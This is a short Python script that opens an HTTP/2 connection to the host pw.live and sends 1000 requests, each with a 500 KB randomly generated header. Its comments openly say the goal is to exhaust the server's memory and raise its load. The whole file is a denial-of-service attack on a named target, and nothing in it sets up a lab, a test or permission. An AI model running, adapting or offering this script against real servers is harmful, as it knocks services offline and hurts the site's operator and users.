import hyper
import string
import random

# Target server details
TARGET = "https://pw.live"

# Generate a very large header value
def generate_large_header(size=100000):
    return ''.join(random.choices(string.ascii_letters, k=size))

# Establish an HTTP/2 connection
conn = hyper.HTTP20Connection("pw.live", port=443)

# Craft the request with excessively large headers
headers = {
    ":method": "GET",
    ":scheme": "https",
    ":path": "/",
    "X-Large-Header": generate_large_header(500000)  # Large header (500 KB)
}

# Send multiple requests to exhaust memory
for _ in range(1000):  # Adjust to increase server load
    conn.request("GET", "/", headers=headers)
    print("Sent large header request")
